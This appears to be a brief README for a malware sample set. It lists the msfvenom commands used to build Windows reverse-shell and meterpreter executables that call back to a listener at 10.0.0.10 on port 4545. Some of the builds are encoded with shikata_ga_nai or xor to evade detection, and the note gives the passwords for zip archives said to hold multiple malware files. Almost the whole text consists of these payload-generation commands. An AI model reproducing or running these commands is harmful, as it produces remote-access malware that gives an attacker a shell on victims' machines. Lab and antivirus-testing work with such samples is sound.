About stuff.exe:
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=4545 -f exe > example.exe
	stuff.zip password is "stuff"


About simple_shell.exe:
    msfvenom LHOST=10.0.0.10 LPORT=4545 --payload windows/shell/reverse_tcp --platform windows --arch x86 > simple_shell.exe
    password is "simple_shell"


msfvenom LHOST=10.0.0.10 LPORT=4545 --payload windows/shell/reverse_tcp --platform windows --arch x86 -e x86/shikata_ga_nai > shikata_shell.exe
msfvenom LHOST=10.0.0.10 LPORT=4545 --payload windows/shell/reverse_tcp --platform windows --arch x86 -e x64/xor > xor_shell.exe


About malware.zip
    password: "toor"
    Contains multiple malware files with various encodings.